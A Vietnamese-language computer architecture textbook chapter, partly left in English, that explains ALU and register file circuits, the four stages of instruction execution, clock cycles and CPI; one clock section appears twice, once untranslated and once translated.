<p>Hình 2 minh họa một mạch ALU ví dụ thực hiện bốn phép toán khác nhau (ADD, OR, AND và EQUALS) trên hai toán hạng 32-bit. Nó cũng tạo ra một code điều kiện duy nhất để chỉ ra liệu kết quả của phép toán có bằng 0 hay không. Lưu ý rằng ALU sử dụng opcode để điều khiển multiplexer nhằm chọn phép toán nào trong bốn phép toán sẽ được xuất ra.</p>
<p><img src="C5-Arch/_images/alu.png" alt="the 4 operations alu with single condition code for zero" /></p>
<p><strong>Hình 2. Một ALU thực hiện bốn phép toán: ADD, OR, AND và EQUALS trên hai toán hạng 32-bit. Nó có một bit đầu ra code điều kiện cho biết kết quả có bằng 0 hay không.</strong></p>
<p>Đầu vào opcode của ALU được lấy từ các bit trong lệnh mà CPU đang thực thi. Ví dụ, code nhị phân của một lệnh ADD có thể gồm bốn phần:</p>
<pre><code>| OPCODE BITS | OPERAND A SOURCE | OPERAND B SOURCE | RESULT DESTINATION |
</code></pre>
<p>Tùy thuộc vào kiến trúc CPU, các bit nguồn toán hạng có thể code hóa một thanh ghi CPU, địa chỉ bộ nhớ chứa giá trị toán hạng, hoặc giá trị toán hạng trực tiếp. Ví dụ, trong một lệnh thực hiện phép cộng 6 + 8, các giá trị trực tiếp 6 và 8 có thể được code hóa trực tiếp vào các bit chỉ định toán hạng của lệnh.</p>
<p>Với ALU của chúng ta, opcode cần hai bit vì ALU hỗ trợ bốn phép toán, và hai bit có thể code hóa bốn giá trị khác nhau (00, 01, 10, 11), mỗi giá trị tương ứng với một phép toán. Nói chung, một ALU thực hiện <em>N</em> phép toán khác nhau sẽ cần log₂(<em>N</em>) bit opcode để chỉ định phép toán nào sẽ được xuất ra từ ALU.</p>
<p>Hình 3 minh họa cách các bit opcode và toán hạng của một lệnh ADD được sử dụng làm đầu vào cho ALU.</p>
<p><img src="C5-Arch/_images/aluadd.png" alt="instruction and opcode bits sent as three input values into ALU" /></p>
<p><strong>Hình 3. Các bit opcode từ một lệnh được ALU sử dụng để chọn phép toán cần xuất ra.</strong> Trong ví dụ này, các bit khác nhau từ một lệnh ADD được đưa vào đầu vào toán hạng và opcode của ALU để thực hiện phép cộng 6 và 8.</p>
<h3 id="552-register-file"><a class="header" href="#552-register-file">5.5.2. Register File</a></h3>
<p>Ở đỉnh của hệ phân cấp bộ nhớ, tập hợp các thanh ghi đa dụng của CPU lưu trữ các giá trị tạm thời. CPU chỉ cung cấp một số lượng rất nhỏ thanh ghi, thường là từ 8 đến 32 (ví dụ: kiến trúc IA32 cung cấp 8, MIPS cung cấp 16, và ARM cung cấp 13). Các lệnh thường lấy giá trị toán hạng từ các thanh ghi đa dụng, hoặc lưu kết quả vào đó. Ví dụ, một lệnh ADD có thể được code hóa là <em>&quot;cộng giá trị từ Register 1 với giá trị từ Register 2 và lưu kết quả vào Register 3&quot;</em>.</p>
<p>Tập hợp các thanh ghi đa dụng của CPU được tổ chức thành một mạch <strong>register file</strong> (&quot;tập thanh ghi&quot;). Một register file bao gồm một tập các <a href="C5-Arch/storagecircs.html#_cpu_register">register circuits</a> (mạch thanh ghi) để lưu trữ dữ liệu, và một số <a href="C5-Arch/controlcircs.html#_control_circuits">control circuits</a> (mạch điều khiển) để điều khiển việc đọc và ghi vào các thanh ghi. Mạch này thường có một đường dữ liệu đầu vào duy nhất để ghi giá trị vào một thanh ghi, và hai đường dữ liệu đầu ra để đọc đồng thời hai giá trị từ các thanh ghi.</p>
<p>Hình 4 minh họa một ví dụ về mạch register file với bốn thanh ghi. Hai giá trị đầu ra của nó (Data out₀ và Data out₁) được điều khiển bởi hai mạch multiplexer. Mỗi đầu vào chọn đọc (Sr₀ và Sr₁) được đưa vào một trong các MUX để chọn giá trị thanh ghi tương ứng cho đầu ra. Đầu vào dữ liệu của register file (đường Data in) được gửi đến tất cả các mạch thanh ghi, và đầu vào ghi (WE) được đưa qua một mạch demultiplexer (DMUX) trước khi được gửi đến từng mạch thanh ghi. Mạch DMUX nhận một giá trị đầu vào và chọn đầu ra nào trong số <em>N</em> đầu ra để gửi giá trị đó, còn lại <em>N-1</em> đầu ra sẽ nhận giá trị 0. Đầu vào chọn ghi (Sw) của register file được gửi đến mạch DMUX để chọn thanh ghi đích nhận giá trị WE. Khi giá trị WE của register file là 0, không có giá trị nào được ghi vào thanh ghi vì mỗi bit WE của thanh ghi cũng nhận giá trị 0 (do đó, Data in không ảnh hưởng đến giá trị lưu trong các thanh ghi). Khi bit WE là 1, DMUX sẽ xuất ra bit WE bằng 1 chỉ đến thanh ghi được chỉ định bởi đầu vào chọn ghi (Sw), kết quả là giá trị Data in chỉ được ghi vào đúng thanh ghi được chọn.</p>
<p><img src="C5-Arch/_images/regfile.png" alt="register file" /></p>
<p><strong>Hình 4. Register file: tập hợp các thanh ghi đa dụng của CPU dùng để lưu trữ toán hạng và giá trị kết quả của lệnh.</strong></p>
<h4 id="special-purpose-registers"><a class="header" href="#special-purpose-registers">Special-Purpose Registers</a></h4>
<p>Ngoài tập hợp các thanh ghi đa dụng trong register file, CPU còn có các thanh ghi chuyên dụng (special-purpose registers) dùng để lưu địa chỉ và nội dung của lệnh. <strong>Program counter</strong> (PC – &quot;bộ đếm chương trình&quot;) lưu địa chỉ bộ nhớ của lệnh tiếp theo cần thực thi, và <strong>instruction register</strong> (IR – &quot;thanh ghi lệnh&quot;) lưu các bit của lệnh hiện tại đang được CPU thực thi. Các bit của lệnh được lưu trong IR sẽ được sử dụng làm đầu vào cho các phần khác nhau của CPU trong quá trình thực thi lệnh. Ta sẽ thảo luận chi tiết hơn về các thanh ghi này trong phần tiếp theo về <a href="C5-Arch/instrexec.html#_the_processors_execution_of_program_instructions">instruction execution</a> (thực thi lệnh của bộ xử lý).</p>
<h3 id="553-cpu"><a class="header" href="#553-cpu">5.5.3. CPU</a></h3>
<p>Với các mạch ALU và register file, ta có thể xây dựng các thành phần chính của CPU như minh họa trong Hình 5. Vì toán hạng của lệnh thường được lấy từ các giá trị lưu trong thanh ghi đa dụng, đầu ra của register file sẽ được gửi đến đầu vào của ALU. Tương tự, vì kết quả của lệnh thường được lưu vào thanh ghi, đầu ra kết quả của ALU sẽ được gửi làm đầu vào cho register file. CPU còn có thêm các mạch để truyền dữ liệu giữa ALU, register file và các thành phần khác (ví dụ: bộ nhớ chính).</p>
<p><img src="C5-Arch/_images/cpu.png" alt="the cpu is built from register file and ALU circuits" /></p>
<p><strong>Hình 5. ALU và register file tạo thành các thành phần chính của CPU.</strong> ALU thực hiện các phép toán, còn register file lưu trữ toán hạng và giá trị kết quả. Các thanh ghi chuyên dụng bổ sung lưu địa chỉ lệnh (PC) và nội dung lệnh (IR). Lưu ý rằng lệnh có thể lấy toán hạng từ hoặc lưu kết quả vào các vị trí khác ngoài register file (ví dụ: bộ nhớ chính).</p>
<p>Các thành phần chính này của CPU tạo thành <strong>data path</strong> (&quot;đường dữ liệu&quot;). Data path bao gồm các phần của CPU thực hiện các phép toán số học và logic (ALU), lưu trữ dữ liệu (các thanh ghi), và các bus kết nối các phần này. CPU cũng triển khai một <strong>control path</strong> (&quot;đường điều khiển&quot;) để điều khiển quá trình thực thi lệnh chương trình bởi ALU trên các toán hạng lưu trong register file. Ngoài ra, control path còn phát lệnh đến các thiết bị I/O và điều phối truy cập bộ nhớ theo yêu cầu của lệnh. Ví dụ, một số lệnh có thể lấy toán hạng trực tiếp từ (hoặc lưu kết quả trực tiếp vào) các vị trí bộ nhớ thay vì từ các thanh ghi đa dụng. Trong phần tiếp theo, ta sẽ tập trung thảo luận về việc thực thi lệnh của CPU với các lệnh lấy toán hạng và lưu kết quả vào register file. CPU cần thêm mạch điều khiển để đọc toán hạng hoặc ghi kết quả lệnh vào các vị trí khác, nhưng các bước thực thi lệnh chính vẫn giống nhau bất kể nguồn và đích của dữ liệu.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="56-quá-trình-thực-thi-lệnh-chương-trình-của-bộ-xử-lý"><a class="header" href="#56-quá-trình-thực-thi-lệnh-chương-trình-của-bộ-xử-lý">5.6. Quá trình thực thi lệnh chương trình của bộ xử lý</a></h2>
<p>Việc thực thi lệnh được thực hiện qua nhiều giai đoạn. Các kiến trúc khác nhau có thể triển khai số lượng giai đoạn khác nhau, nhưng hầu hết đều triển khai các pha Fetch, Decode, Execute và WriteBack trong ít nhất bốn giai đoạn riêng biệt. Trong phần thảo luận về quá trình thực thi lệnh, ta sẽ tập trung vào bốn giai đoạn này và sử dụng một lệnh ADD làm ví dụ minh họa. Lệnh ADD ví dụ được code hóa như minh họa trong Hình 1.</p>
<p><img src="C5-Arch/_images/instrformat.png" alt="the instruction format used as an example" /></p>
<p><strong>Hình 1. Một ví dụ về định dạng lệnh cho phép toán ba thanh ghi.</strong><br />
Lệnh được code hóa dưới dạng nhị phân, với các nhóm bit con tương ứng với các phần khác nhau của lệnh: phép toán (opcode), hai thanh ghi nguồn (toán hạng), và thanh ghi đích để lưu kết quả phép toán. Ví dụ minh họa cách code hóa một lệnh ADD theo định dạng này.</p>
<p>Để thực thi một lệnh, CPU đầu tiên sẽ <em>fetch</em> (nạp) lệnh tiếp theo từ bộ nhớ vào một thanh ghi chuyên dụng gọi là instruction register (IR – &quot;thanh ghi lệnh&quot;). Địa chỉ bộ nhớ của lệnh cần nạp được lưu trong một thanh ghi chuyên dụng khác gọi là program counter (PC – &quot;bộ đếm chương trình&quot;). PC theo dõi địa chỉ bộ nhớ của lệnh tiếp theo cần nạp và được tăng lên như một phần của giai đoạn fetch, để nó lưu địa chỉ của lệnh kế tiếp. Ví dụ, nếu tất cả lệnh đều dài 32 bit, thì giá trị của PC sẽ được tăng thêm 4 (vì mỗi byte = 8 bit có địa chỉ riêng) để lưu địa chỉ bộ nhớ của lệnh ngay sau lệnh vừa được nạp. Các mạch số học riêng biệt với ALU sẽ thực hiện việc tăng giá trị của PC. Giá trị của PC cũng có thể thay đổi trong giai đoạn WriteBack. Ví dụ, một số lệnh sẽ nhảy đến địa chỉ cụ thể, như trong các vòng lặp, cấu trúc <code>if</code>-<code>else</code>, hoặc lời gọi hàm. <a href="C5-Arch/instrexec.html#Figfetchstage">Hình 2</a> minh họa giai đoạn fetch.</p>
<p><img src="C5-Arch/_images/fetch.png" alt="CPU Fetch stage of execution" /></p>
<p><strong>Hình 2. Giai đoạn Fetch trong quá trình thực thi lệnh:</strong><br />
Lệnh tại địa chỉ bộ nhớ được lưu trong thanh ghi PC sẽ được đọc từ bộ nhớ và lưu vào IR. Giá trị của PC cũng được tăng lên ở cuối giai đoạn này (nếu mỗi lệnh dài 4 byte thì địa chỉ tiếp theo là 1238; kích thước thực tế của lệnh phụ thuộc vào kiến trúc và loại lệnh).</p>
<p>Sau khi nạp lệnh, CPU sẽ <em>decode</em> (giải code) các bit lệnh được lưu trong IR thành bốn phần: các bit cao của lệnh code hóa opcode, xác định phép toán cần thực hiện (ví dụ: ADD, SUB, OR, ...), và các bit còn lại được chia thành ba nhóm con để chỉ định hai nguồn toán hạng và vị trí lưu kết quả. Trong ví dụ này, ta sử dụng các thanh ghi cho cả hai nguồn và đích kết quả. Opcode được truyền qua các dây dẫn đến đầu vào của ALU, và các bit nguồn được truyền đến đầu vào của register file. Các bit nguồn được gửi đến hai đầu vào chọn đọc (Sr₀ và Sr₁), xác định giá trị thanh ghi nào sẽ được đọc từ register file. Giai đoạn Decode được minh họa trong Hình 3.</p>
<p><img src="C5-Arch/_images/decode.png" alt="CPU Decode stage of execution" /></p>
<p><strong>Hình 3. Giai đoạn Decode trong quá trình thực thi lệnh:</strong><br />
Tách các bit lệnh trong IR thành các thành phần và truyền chúng làm đầu vào cho ALU và register file. Các bit opcode trong IR được gửi đến đầu vào chọn của ALU để chọn phép toán cần thực hiện. Hai nhóm bit toán hạng trong IR được gửi đến đầu vào chọn của register file để chọn các thanh ghi cần đọc giá trị toán hạng. Các bit đích trong IR sẽ được gửi đến register file trong giai đoạn WriteBack, xác định thanh ghi cần ghi kết quả từ ALU.</p>
<p>Sau khi giai đoạn Decode xác định được phép toán cần thực hiện và nguồn toán hạng, ALU sẽ thực hiện phép toán đó trong giai đoạn tiếp theo – <em>Execution</em>. Đầu vào dữ liệu của ALU đến từ hai đầu ra của register file, và đầu vào chọn của ALU đến từ các bit opcode của lệnh. Các đầu vào này được truyền qua ALU để tạo ra kết quả bằng cách kết hợp các giá trị toán hạng với phép toán. Trong ví dụ này, ALU sẽ xuất ra kết quả của phép cộng giữa giá trị lưu trong Reg1 và giá trị lưu trong Reg3, đồng thời xuất ra các code điều kiện liên quan đến kết quả. Giai đoạn Execution được minh họa trong Hình 4.</p>
<p><img src="C5-Arch/_images/exec.png" alt="execution stage" /></p>
<p><strong>Hình 4. Giai đoạn Execution trong quá trình thực thi lệnh:</strong><br />
ALU thực hiện phép toán được chỉ định (từ các bit opcode của lệnh) trên các giá trị đầu vào (từ đầu ra của register file).</p>
<p>Trong giai đoạn <em>WriteBack</em>, kết quả từ ALU sẽ được lưu vào thanh ghi đích. Register file nhận đầu ra kết quả của ALU qua đầu vào Data in, thanh ghi đích (từ các bit lệnh trong IR) qua đầu vào chọn ghi (Sw), và giá trị 1 ở đầu vào WE. Ví dụ, nếu thanh ghi đích là Reg0, thì các bit code hóa Reg0 trong IR sẽ được gửi đến đầu vào Sw của register file để chọn thanh ghi đích. Đầu ra từ ALU được gửi đến đầu vào Data in của register file, và bit WE được đặt bằng 1 để cho phép ghi kết quả từ ALU vào Reg0. Giai đoạn WriteBack được minh họa trong <a href="C5-Arch/instrexec.html#Figrbstage">Hình 5</a>.</p>
<p><img src="C5-Arch/_images/writeback.png" alt="writeback stage" /></p>
<p><strong>Hình 5. Giai đoạn WriteBack trong quá trình thực thi lệnh:</strong><br />
Kết quả từ giai đoạn thực thi (đầu ra từ ALU) được ghi vào thanh ghi đích trong register file. Đầu ra của ALU là đầu vào Data in của register file, các bit đích của lệnh được gửi đến đầu vào chọn ghi (Sw), và đầu vào WE được đặt bằng 1 để cho phép ghi giá trị Data in vào thanh ghi đích được chỉ định.</p>
<h3 id="561-clock-driven-execution"><a class="header" href="#561-clock-driven-execution">5.6.1. Clock-Driven Execution</a></h3>
<p>A clock drives the CPU's execution of instructions, triggering the start
of each stage. In other words, the clock is used by the CPU to determine
when inputs to circuits associated with each stage are ready to be used
by the circuit, and it controls when outputs from circuits represent
valid results from one stage and can be used as inputs to other circuits
executing the next stage.</p>
<p>A CPU clock measures discrete time as opposed to continuous time. In
other words, there exists a time 0, followed by a time 1, followed by a
time 2, and so on for each subsequent clock tick. A processor's <strong>clock
cycle time</strong> measures the time between each clock tick. A processor's
<strong>clock speed</strong> (or <strong>clock rate</strong>) is <code>1/(clock cycle time)</code>. It is
typically measured in megahertz (MHz) or gigahertz (GHz). A 1-MHz clock
rate has one million clock ticks per second, and 1-GHz has one billion
clock ticks per second. The clock rate is a measure of how fast the CPU
can run, and is an estimate of the maximum number of instructions per
second a CPU can execute. For example, on simple scalar processors like
our example CPU, a 2-GHz processor might achieve a maximum instruction
execution rate of two billion instructions per second (or two
instructions every nanosecond).</p>
<p>Although increasing the clock rate on a single machine will improve its
performance, clock rate alone is not a meaningful metric for comparing
the performance of different processors. For example, some architectures
(such as RISC) require fewer stages to execute instructions than others
(such as CISC). In architectures with fewer execution stages a slower
clock may yield the same number of instructions completed per second as
on another architecture with a faster clock rate but more execution
stages. For a specific microprocessor, however, doubling its clock speed
will roughly double its instruction execution speed.</p>
<blockquote>
<blockquote>
<p>Clock Rates and Processor Performance</p>
</blockquote>
</blockquote>
<p>Historically, increasing the clock rate (along with designing more
complicated and powerful microarchitectures that a faster clock can
drive) has been a very effective way for computer architects to improve
processor performance. For example, in 1974, the Intel 8080 CPU ran at 2
MHz (a clock rate of two million cycles per second). The clock rate of
the Intel Pentium Pro, introduced in 1995, was 150 MHz (150 million
cycles per second), and the clock rate of the Intel Pentium 4,
introduced in 2000, was 1.3 GHz or (1.3 <em>billion</em> cycles per second).
Clock rates peaked in the mid to late 2000s with processors like the IBM
z10, which had a clock rate of 4.4 GHz.</p>
<p>Today, however, CPU clock rates have reached their limit due to problems
associated with handling heat dissipation of faster clocks. This limit
is known as the <strong>power wall</strong>. The power wall resulted in the
development of multicore processors starting in the mid 2000s. Multicore
processors have multiple &quot;simple&quot; CPU cores per chip, each core driven
by a clock whose rate has not increased from the previous-generation
core. Multicore processor design is a way to improve CPU performance
without having to increase the CPU clock rate.</p>
<h4 id="the-clock-circuit"><a class="header" href="#the-clock-circuit">The Clock Circuit</a></h4>
<p>A clock circuit uses an oscillator circuit to generate a very precise
and regular pulse pattern. Typically, a crystal oscillator generates the
base frequency of the oscillator circuit, and the pulse pattern of the
oscillator is used by the clock circuit to output a pattern of
alternating high and low voltages corresponding to an alternating
pattern of 1 and 0 binary values. Figure 6 shows an
example clock circuit generating a regular output pattern of 1 and 0.</p>
<p><img src="C5-Arch/_images/clock.png" alt="a clock circuit generates regular pattern of 1 and 0" /></p>
<p>Figure 6. The regular output pattern of 1 and 0 of a clock circuit. Each
sequence of 1 and 0 makes up a clock cycle.</p>
<p>A <strong>clock cycle</strong> (or tick) is a 1 and 0 subsequence from the clock
circuit pattern. The transition from a 1 to a 0 or a 0 to a 1 is called
a <strong>clock edge</strong>. Clock edges trigger state changes in CPU circuits,
driving the execution of instructions. The rising clock edge (the
transition from 0 to 1 at the beginning of a new clock cycle) indicates
a state in which input values are ready for a stage of instruction
execution. For example, the rising edge transition signals that input
values to the ALU circuit are ready. While the clock's value is 1, these
inputs propagate through the circuit until the output of the circuit is
ready. This is called the <strong>propagation delay</strong> through the circuit. For
example, while the clock signal is 1 the input values to the ALU
propagate through the ALU operation circuits and then through the
multiplexer to produce the correct output from the ALU for the operation
combining the input values. On the falling edge (the transition from 1
to 0), the outputs of the stage are stable and ready to be propagated to
the next location (shown as &quot;output ready&quot; in <a href="C5-Arch/instrexec.html#Figrisingedge">Figure
7</a>). For example, the output from the ALU is ready on
the falling edge. For the duration of the clock value 0, the ALU's
output propagates to register file inputs. On the next clock cycle the
rising edge indicates that the register file input value is ready to
write into a register (shown as &quot;new input&quot; in <a href="C5-Arch/instrexec.html#Figrisingedge">Figure
7</a>).</p>
<p><img src="C5-Arch/_images/cycle.png" alt="clock cycle" /></p>
<p>Figure 7. The rising edge of a new clock cycle triggers changes in the
inputs to the circuits it controls. The falling edge triggers when the
outputs are valid from the circuits it controls.</p>
<h3 id="561-thực-thi-điều-khiển-bằng-xung-nhịp"><a class="header" href="#561-thực-thi-điều-khiển-bằng-xung-nhịp">5.6.1. Thực thi điều khiển bằng xung nhịp</a></h3>
<p>Một xung nhịp (clock) điều khiển quá trình thực thi lệnh của CPU, kích hoạt điểm bắt đầu của mỗi giai đoạn. Nói cách khác, xung nhịp được CPU sử dụng để xác định khi nào các đầu vào của mạch ở mỗi giai đoạn đã sẵn sàng để được xử lý, và nó kiểm soát thời điểm đầu ra từ các mạch là kết quả hợp lệ từ một giai đoạn và có thể được sử dụng làm đầu vào cho các mạch thực thi giai đoạn tiếp theo.</p>
<p>Xung nhịp của CPU đo thời gian rời rạc thay vì liên tục. Tức là tồn tại thời điểm 0, sau đó là thời điểm 1, rồi thời điểm 2, và cứ thế tiếp tục với mỗi nhịp xung tiếp theo. <strong>Clock cycle time</strong> (thời gian chu kỳ xung nhịp) của bộ xử lý đo khoảng thời gian giữa hai nhịp xung liên tiếp. <strong>Clock speed</strong> (tốc độ xung nhịp) hay <strong>clock rate</strong> (tần số xung nhịp) của bộ xử lý được tính bằng công thức <code>1 / (clock cycle time)</code>. Đơn vị đo phổ biến là megahertz (MHz) hoặc gigahertz (GHz). Tần số 1 MHz tương ứng với một triệu nhịp xung mỗi giây, còn 1 GHz là một tỷ nhịp xung mỗi giây. Tần số xung nhịp là thước đo tốc độ chạy của CPU, và là ước lượng số lệnh tối đa mà CPU có thể thực thi mỗi giây. Ví dụ, với bộ xử lý đơn giản kiểu scalar như CPU ví dụ của chúng ta, một CPU 2 GHz có thể đạt tốc độ thực thi tối đa là hai tỷ lệnh mỗi giây (tức là hai lệnh mỗi nanosecond).</p>
<p>Mặc dù việc tăng tần số xung nhịp trên một máy đơn lẻ sẽ cải thiện hiệu năng của nó, nhưng tần số xung nhịp không phải là chỉ số có ý nghĩa khi so sánh hiệu năng giữa các bộ xử lý khác nhau. Ví dụ, một số kiến trúc (như RISC) yêu cầu ít giai đoạn thực thi hơn so với các kiến trúc khác (như CISC). Trong các kiến trúc có ít giai đoạn thực thi hơn, một xung nhịp chậm hơn vẫn có thể hoàn thành số lượng lệnh mỗi giây tương đương với kiến trúc khác có xung nhịp nhanh hơn nhưng nhiều giai đoạn hơn. Tuy nhiên, với một vi xử lý cụ thể, nếu tăng gấp đôi tần số xung nhịp thì tốc độ thực thi lệnh cũng sẽ tăng gần gấp đôi.</p>
<blockquote>
<p>Tần số xung nhịp và hiệu năng bộ xử lý</p>
</blockquote>
<p>Trong lịch sử, việc tăng tần số xung nhịp (kết hợp với thiết kế các vi kiến trúc phức tạp và mạnh mẽ hơn để tận dụng xung nhịp nhanh hơn) là một cách rất hiệu quả để các kiến trúc sư máy tính cải thiện hiệu năng bộ xử lý. Ví dụ, vào năm 1974, CPU Intel 8080 chạy ở tần số 2 MHz (hai triệu chu kỳ mỗi giây). CPU Intel Pentium Pro ra mắt năm 1995 có tần số 150 MHz (150 triệu chu kỳ mỗi giây), và CPU Intel Pentium 4 ra mắt năm 2000 có tần số 1.3 GHz (tức là 1.3 <em>tỷ</em> chu kỳ mỗi giây). Tần số xung nhịp đạt đỉnh vào giữa đến cuối những năm 2000 với các bộ xử lý như IBM z10, có tần số 4.4 GHz.</p>
<p>Tuy nhiên, ngày nay tần số xung nhịp của CPU đã chạm đến giới hạn do các vấn đề liên quan đến việc tản nhiệt khi xung nhịp tăng cao. Giới hạn này được gọi là <strong>power wall</strong> (&quot;bức tường năng lượng&quot;). Power wall đã dẫn đến sự phát triển của các bộ xử lý đa nhân (multicore) bắt đầu từ giữa những năm 2000. Bộ xử lý đa nhân có nhiều nhân CPU “đơn giản” trên mỗi chip, mỗi nhân được điều khiển bởi một xung nhịp có tần số không tăng so với thế hệ trước. Thiết kế bộ xử lý đa nhân là một cách để cải thiện hiệu năng CPU mà không cần tăng tần số xung nhịp.</p>
<h4 id="mạch-xung-nhịp"><a class="header" href="#mạch-xung-nhịp">Mạch xung nhịp</a></h4>
<p>Một mạch xung nhịp sử dụng mạch dao động (oscillator) để tạo ra chuỗi xung rất chính xác và đều đặn. Thông thường, một mạch dao động tinh thể (crystal oscillator) tạo ra tần số cơ bản của mạch dao động, và chuỗi xung của mạch dao động được mạch xung nhịp sử dụng để tạo ra chuỗi điện áp cao và thấp luân phiên, tương ứng với chuỗi giá trị nhị phân 1 và 0. Hình 6 minh họa một mạch xung nhịp tạo ra chuỗi đầu ra đều đặn gồm 1 và 0.</p>
<p><img src="C5-Arch/_images/clock.png" alt="a clock circuit generates regular pattern of 1 and 0" /></p>
<p><strong>Hình 6. Chuỗi đầu ra đều đặn gồm 1 và 0 của mạch xung nhịp.</strong><br />
Mỗi chuỗi 1 và 0 tạo thành một chu kỳ xung nhịp.</p>
<p>Một <strong>clock cycle</strong> (chu kỳ xung nhịp, hay tick) là một chuỗi con gồm 1 và 0 từ chuỗi mạch xung nhịp. Việc chuyển từ 1 sang 0 hoặc từ 0 sang 1 được gọi là <strong>clock edge</strong> (cạnh xung nhịp). Các cạnh xung nhịp kích hoạt sự thay đổi trạng thái trong các mạch của CPU, điều khiển quá trình thực thi lệnh. Cạnh xung nhịp lên (rising edge – chuyển từ 0 sang 1 ở đầu chu kỳ mới) biểu thị trạng thái mà các giá trị đầu vào đã sẵn sàng cho một giai đoạn thực thi lệnh. Ví dụ, cạnh lên báo hiệu rằng các giá trị đầu vào cho mạch ALU đã sẵn sàng. Trong khi giá trị xung nhịp là 1, các đầu vào này sẽ truyền qua mạch cho đến khi đầu ra của mạch sẵn sàng. Quá trình này gọi là <strong>propagation delay</strong> (độ trễ lan truyền) qua mạch. Ví dụ, khi tín hiệu xung nhịp là 1, các giá trị đầu vào sẽ truyền qua mạch thực hiện phép toán của ALU, sau đó qua multiplexer để tạo ra đầu ra chính xác từ ALU cho phép toán kết hợp các giá trị đầu vào. Ở cạnh xuống (falling edge – chuyển từ 1 sang 0), đầu ra của giai đoạn sẽ ổn định và sẵn sàng truyền đến vị trí tiếp theo (được biểu thị là “output ready” trong <a href="C5-Arch/instrexec.html#Figrisingedge">Hình 7</a>). Ví dụ, đầu ra từ ALU sẽ sẵn sàng ở cạnh xuống. Trong khoảng thời gian xung nhịp có giá trị 0, đầu ra của ALU sẽ truyền đến đầu vào của register file. Ở chu kỳ xung nhịp tiếp theo, cạnh lên sẽ báo hiệu rằng giá trị đầu vào của register file đã sẵn sàng để ghi vào thanh ghi (biểu thị là “new input” trong <a href="C5-Arch/instrexec.html#Figrisingedge">Hình 7</a>).</p>
<p><img src="C5-Arch/_images/cycle.png" alt="clock cycle" /></p>
<p><strong>Hình 7. Cạnh lên của chu kỳ xung nhịp mới kích hoạt thay đổi ở đầu vào của các mạch mà nó điều khiển.</strong><br />
Cạnh xuống kích hoạt thời điểm đầu ra từ các mạch trở nên hợp lệ.</p>
<p>Độ dài của chu kỳ xung nhịp (hoặc tần số xung nhịp) bị giới hạn bởi độ trễ lan truyền dài nhất qua bất kỳ giai đoạn nào trong quá trình thực thi lệnh. Giai đoạn thực thi và quá trình lan truyền qua ALU thường là giai đoạn dài nhất. Do đó, một nửa thời gian chu kỳ xung nhịp không được nhanh hơn thời gian cần thiết để các giá trị đầu vào của ALU truyền qua mạch thực hiện phép toán chậm nhất để đến đầu ra của ALU (nói cách khác, đầu ra phản ánh kết quả của phép toán trên đầu vào). Ví dụ, trong ALU có bốn phép toán (OR, ADD, AND và EQUALS), mạch ripple carry adder có độ trễ lan truyền dài nhất và quyết định độ dài tối thiểu của chu kỳ xung nhịp.</p>
<p>Vì cần một chu kỳ xung nhịp để hoàn thành một giai đoạn trong quá trình thực thi lệnh của CPU, một bộ xử lý có chuỗi thực thi lệnh gồm bốn giai đoạn (Fetch, Decode, Execute, WriteBack; xem <a href="C5-Arch/instrexec.html#Fig4cycleinstr">Hình 8</a>) sẽ hoàn thành tối đa một lệnh sau mỗi bốn chu kỳ xung nhịp.</p>
<p><img src="C5-Arch/_images/instrcycles.png" alt="Four clock cycles to complete 1 instruction" /></p>
<p><strong>Hình 8. Thực thi lệnh gồm bốn giai đoạn cần bốn chu kỳ xung nhịp để hoàn tất.</strong></p>
<p>Ví dụ, nếu tần số xung nhịp là 1 GHz, thì một lệnh mất 4 nanosecond để hoàn thành (mỗi giai đoạn mất 1 nanosecond). Với tần số 2 GHz, một lệnh chỉ mất 2 nanosecond để hoàn thành.</p>
<p>Mặc dù tần số xung nhịp là một yếu tố ảnh hưởng đến hiệu năng của bộ xử lý, nhưng bản thân nó không phải là thước đo có ý nghĩa để đánh giá hiệu năng. Thay vào đó, số chu kỳ trung bình trên mỗi lệnh (<strong>cycles per instruction</strong>, viết tắt là CPI) được đo trên toàn bộ quá trình thực thi của chương trình là thước đo tốt hơn cho hiệu năng của CPU. Thông thường, một bộ xử lý không thể duy trì CPI tối đa trong suốt quá trình thực thi chương trình. CPI thấp hơn mức tối đa là kết quả của nhiều yếu tố, bao gồm việc thực thi các cấu trúc chương trình phổ biến làm thay đổi luồng điều khiển như vòng lặp, rẽ nhánh <code>if</code>-<code>else</code>, và lời gọi hàm. CPI trung bình khi chạy một tập hợp chương trình chuẩn (benchmark) được sử dụng để so sánh giữa các kiến trúc khác nhau. CPI là thước đo chính xác hơn về hiệu năng CPU vì nó đo tốc độ thực thi toàn bộ chương trình, thay vì chỉ đo một khía cạnh của việc thực thi một lệnh đơn lẻ. Để tìm hiểu thêm về hiệu năng bộ xử lý và cách thiết kế để cải thiện hiệu năng, hãy tham khảo các giáo trình kiến trúc máy tính<sup class="footnote-reference"><a href="#1">1</a></sup>.</p>
<h3 id="562-tổng-hợp-cpu-trong-một-máy-tính-hoàn-chỉnh"><a class="header" href="#562-tổng-hợp-cpu-trong-một-máy-tính-hoàn-chỉnh">5.6.2. Tổng hợp: CPU trong một máy tính hoàn chỉnh</a></h3>
<p>Đường dữ liệu (data path – gồm ALU, register file và các bus kết nối chúng) và đường điều khiển (control path – mạch thực thi lệnh) tạo thành CPU. Chúng cùng nhau triển khai các phần xử lý và điều khiển trong kiến trúc von Neumann. Các bộ xử lý hiện đại ngày nay được triển khai dưới dạng mạch số khắc trên chip silicon. Chip bộ xử lý cũng bao gồm một số bộ nhớ đệm (cache) tốc độ cao trên chip (được triển khai bằng mạch lưu trữ latch), dùng để lưu bản sao của dữ liệu chương trình và lệnh vừa được sử dụng gần đây, giúp chúng nằm gần CPU hơn. Xem <a href="C5-Arch/../C11-MemHierarchy/index.html#_storage_and_the_memory_hierarchy">Chương Bộ nhớ và Hệ phân cấp lưu trữ</a> để biết thêm thông tin về bộ nhớ cache trên chip.</p>
<p>Hình 9 minh họa một ví dụ về bộ xử lý trong ngữ cảnh của một máy tính hiện đại hoàn chỉnh, nơi các thành phần cùng nhau triển khai kiến trúc von Neumann.</p>
<p><img src="C5-Arch/_images/moderncomputer.png" alt="a CPU in a modern computer" /></p>
<p><strong>Hình 9. CPU trong một máy tính hiện đại hoàn chỉnh.</strong><br />
Các bus kết nối chip bộ xử lý, bộ nhớ chính, và các thiết bị vào ra.</p>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
<p>Hennessy, John &amp; Patterson, David. <em>Computer Architecture: A Quantitative Approach</em>. Morgan Kaufmann, 2017.</p>
</div>
